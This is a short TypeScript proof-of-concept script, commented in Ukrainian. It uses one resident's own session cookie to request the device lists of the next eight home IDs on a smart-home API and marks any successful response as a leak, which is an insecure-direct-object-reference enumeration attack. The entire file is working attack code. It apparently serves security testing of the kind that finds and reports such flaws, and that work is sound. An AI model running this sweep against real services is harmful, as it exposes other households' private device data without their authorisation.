// idor-sweep.ts — перебір чужих домів під ВЛАСНОЮ сесією мешканця #4021
const BASE = "https://api.dh.example";
const cookie = process.env.DH_SESSION!;      // сесія залогіненого #4021 — його ЧЕСНИЙ вхід

async function probe(homeId: number) {
  const res = await fetch(`${BASE}/api/homes/${homeId}/devices`, {
    headers: { cookie },                      // та сама сесія на КОЖЕН id
  });
  if (res.status !== 200) return { homeId, status: res.status, count: 0 };
  const devices = (await res.json()) as unknown[];
  return { homeId, status: 200, count: devices.length };
}

const mine = 4021;
for (let id = mine + 1; id <= mine + 8; id++) {   // сусіди, яких ми не маємо бачити
  const r = await probe(id);
  const leak = r.status === 200 ? "  ← ВИТІК" : "";
  console.log(`home ${id}: ${r.status}  devices=${r.count}${leak}`);
}
